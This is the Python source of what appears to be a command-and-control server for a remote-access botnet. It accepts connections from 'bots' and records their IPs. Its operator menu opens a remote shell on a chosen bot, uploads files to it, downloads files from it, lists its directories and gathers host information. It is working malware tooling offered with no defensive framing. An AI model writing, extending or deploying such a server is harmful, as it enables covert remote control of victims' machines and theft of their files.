import json
import os.path
import random
import socket, pickle#, security
import string
import threading, traceback
import time
from datetime import datetime
from colorama import init, Fore, Back, Style

init(autoreset=True)

addr = ('192.168.0.224', 5000)
#decryptor = security.get_decryptor()

standard_text = Fore.YELLOW
warning_text = Fore.RED + Style.BRIGHT
users = []
user_file = 'users.json'
buf_size = 4096

def is_int(str):
    try:
        return int(str)
    except:
        return False

def get_choice(opts, title, subtitle=None):
    opt = None
    while not opt or not is_int(opt) or not 1 <= int(opt) <= len(opts):
        print(Back.CYAN + Fore.BLACK + ' ' + title + ' ')
        if subtitle:
            print(Fore.CYAN + Style.BRIGHT + subtitle)
        for opt in enumerate(opts):
            print(f'{Fore.BLUE}{opt[0] + 1}. {opt[1]}')
        opt = input(Fore.CYAN + '> ')
    return int(opt) - 1

def show(d):
    if isinstance(d, dict):
        for value in d:
            print(f'{Fore.GREEN + Style.BRIGHT}{value.capitalize()}: {Fore.MAGENTA}{d[value]}')
    else:
        print(f'{Fore.GREEN + Style.BRIGHT + d}')

def get_user(id):
    for user in users:
        if user.id == id:
            return user
#todo add option to uninstall from client
class User():
    def __init__(self, conn=None, name=None, ip=None):
        if conn:
            self.conn = conn
            self.ip, self.port = conn[1][0], conn[1][1]
        else:
            self.ip = ip.split(':')[0]
        self.name = name
        self.hist = []
        self.msg = None
        self.alive = True if conn else False
        self.id = ''.join(random.choices(string.ascii_lowercase, k=8))
        self.expected_size = None
        self.tmp_part = None
        if self.alive:
            self.hist.append({'from': 'server', 'msg': 'client connected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            threading.Thread(target=self.keep_alive, args=()).start()

    def restart(self, conn, name):
        self.alive = True
        self.conn = conn
        self.name = name
        self.port = conn[1][1]
        self.hist.append({'from': 'server', 'msg': 'client reconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
        threading.Thread(target=self.keep_alive, args=()).start()

    def keep_alive(self):
        while self.alive:
            try:
                self.conn[0].send(pickle.dumps({'type': 'keepalive'}))
                time.sleep(3)
            except:
                self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
                self.alive = False
                return

    def send(self, msg):
        self.conn[0].sendall(pickle.dumps(msg))
        self.hist.append({'from': 'server', 'msg': msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})

    def get_response(self, alert=True):
        # get next msg from user
        self.start = time.time()
        if alert:
            print(standard_text + 'Waiting for client response...')
        self.old_num = len([m for m in self.hist if m['from'] == 'client'])
        while self.alive and self.old_num == len([m for m in self.hist if m['from'] == 'client']) and time.time() - self.start < 30:
            pass
        if not self.alive:
            return {'exit': 1, 'msg': 'Clent disconnected'}
        elif time.time() - self.start > 30:
            return {'exit': 1, 'msg': 'Client response timed out'}
        else:
            return [m for m in self.hist if m['from'] == 'client'][-1]['msg']

    def read(self):
        try:
            if self.expected_size:
                self.msg = []
                while self.expected_size > 0:
                    self.tmp_part = self.conn[0].recv(min(self.expected_size, buf_size))
                    if not self.tmp_part:
                        raise Exception('Unexpected EOF')
                    self.msg.append(self.tmp_part)
                    self.expected_size -= len(self.tmp_part)
                self.msg = b''.join(self.msg)
                self.msg = clean(self.msg)
                self.expected_size = None

                if self.msg != -1:
                    self.hist.append({'from': 'client', 'msg': self.msg,
                                      'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
                    return self.msg
            else:
                self.msg = self.conn[0].recv(buf_size)
                self.msg = clean(self.msg)
                self.expected_size = self.msg['incoming']
        except:
            self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
            self.alive = False
            return -2

    def manage(self):
        while self.alive:
            self.m = self.read()
            if self.m == -2:
                return
            #elif not self.m:
            #    self.send('Invalid input recieved')

def clean(msg):
    try:
        #msg = decryptor.decrypt(msg)
        return pickle.loads(msg)
    except ValueError:
        return -1

def upload(user):
    if user.alive:
        file = None
        while not file:
            file = input('Enter file path of file to upload: ')
            if not os.path.isfile(file):
                file = None
                print(warning_text + 'Enter valid file')
        loc = input('Enter path to download file to on client: ')
        print(f'Uploading {file} from server to {loc} on client...')
        with open(file, 'rb') as f:
            content = f.read()
            msg = {'type': 'file', 'loc': loc, 'content': content}
            f.seek(0, 2)
            user.send({'type': 'upload', 'size': len(pickle.dumps(msg))})
            user.send(msg)
        response = user.get_response()
        if response['exit'] == 0:
            print(response['msg'])
        else:
            print(warning_text + 'Error: ' + response['msg'])

def download(user):
    file = input('Enter file to download from client: ')
    loc = input('Where to download file to: ')
    user.send({'type': 'download', 'file': file})
    response = user.get_response()
    if response['exit'] == 0:
        with open(loc, 'wb') as f:
            f.write(response['msg'])
        print('File saved successfully')
    else:
        print(warning_text + 'Error: ' + response['msg'])

def get_instructions():
    opt = get_choice(['Select a bot'], 'Main Menu')
    if opt == 0:
        if len(users) > 0:
            curr_users = [u.id for u in users]  # in case list of users changes before selection made
            opt = get_choice([f'{user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP:port | Status')
            if opt != len(curr_users):
                user = get_user(curr_users[opt])
                bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Upload File to Client' if not user.alive else 'Upload File to Client', Back.RED + 'Download File From Client' if not user.alive else 'Download File From Client', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs', 'Main Menu']
                opt = get_choice(bot_opts, 'Choose an action:', subtitle=f'For: {user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}')
                if opt == 0:
                    if user.alive:
                        print('"Exit" to exit shell')
                        print('"download" to download a file from client, "upload" to upload a file to client')
                        print('Starting shell...')
                        user.send({'type': 'shell', 'cmd': 'get_loc'})
                        response = user.get_response(alert=False)['msg']
                        next_cmd = None
                        while next_cmd != 'exit':
                            next_cmd = input(f'{response["loc"]}>')
                            if next_cmd == 'upload':
                                upload(user)
                            elif next_cmd == 'download':
                                download(user)
                            else:
                                user.send({'type': 'shell', 'cmd': next_cmd})
                                response = user.get_response(alert=False)
                                exit_code = response['exit']
                                response = response['msg']
                            if 'output' in response:
                                #while 'working' in response:
                                #    response = user.get_response(alert=False)['msg']
                                #    print(response['output'])
                                if exit_code == 0:
                                    print(response['output'])
                                else:
                                    print(warning_text + 'Error: ' + response['output'])
                        print('Closed shell')
                    else:
                        print(warning_text + 'Dead bot, chose a live one')
                elif opt == 1:
                    if user.alive:
                        upload(user)
                    else:
                        print(warning_text + 'Dead bot, chose a live one')
                elif opt == 2:
                    if user.alive:
                        download(user)
                    else:
                        print(warning_text + 'Dead bot, chose a live one')
                elif opt == 3:
                    if user.alive:
                        scan_dir = input('Enter directory to scan: ')
                        output_file = input('Enter filename to save results to (blank to display results in terminal): ')
                        user.send({'type': 'getfiles', 'loc': scan_dir})
                        response = user.get_response()
                        if output_file == '' or response['exit'] == 1:
                            print(standard_text + f'Client info received from {user.name}:')
                            show(response['msg'])
                        else:
                            with open(output_file, 'w') as f:
                                f.write(response['msg'])
                            print(standard_text + f'Wrote results from client to {output_file}')
                    else:
                        print(warning_text + 'Dead bot, chose a live one')
                elif opt == 4:
                    if user.alive:
                        user.send({'type': 'getinfo'})
                        response = user.get_response()
                        print(standard_text + f'Client info received from {user.name}:')
                        show(response['msg'])
                    else:
                        print(warning_text + 'Dead bot, chose a live one')
                elif opt == 5:
                    for msg in user.hist:
                        print(Fore.MAGENTA + f'{msg["timestamp"]} | {msg["from"]}: {msg["msg"]}')
        else:
            print(warning_text + 'No bots found')
        get_instructions()

def run():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(addr)
    server.listen()
    print(standard_text + f'Server running on {addr[0]}:{addr[1]}')
    print(standard_text + 'Wait a few seconds for any live bots to connect')

    # create inactive user objects for saved ips
    if os.path.isfile(user_file):
        with open(user_file, 'r') as f:
            read_users = json.load(f)
        for u in read_users:
            users.append(User(ip=u, name=read_users[u]))

    threading.Thread(target=get_instructions, args=()).start()

    while True:
        conn = server.accept()
        try:
            name = conn[0].recv(buf_size)
            name = clean(name)['name']
            user = None
            for u in users:
                if  u.ip == conn[1][0]:
                    user = get_user(u.id)
                    user.restart(conn, name)
                    break
            if not user:
                user = User(conn, name)
                users.append(user)
            if not os.path.isfile(user_file):
                with open(user_file, 'w') as f:
                    json.dump({}, f)
            with open(user_file, 'r') as f:
                read_users = json.load(f)
            read_users[conn[1][0]] = name
            with open(user_file, 'w') as f:
                json.dump(read_users, f)
            threading.Thread(target=user.manage, args=()).start()
        except:
            print(warning_text + f'Discarding connection because invalid name recieved from {conn[1][0]}:{conn[1][1]}')


if __name__ == '__main__':
    run()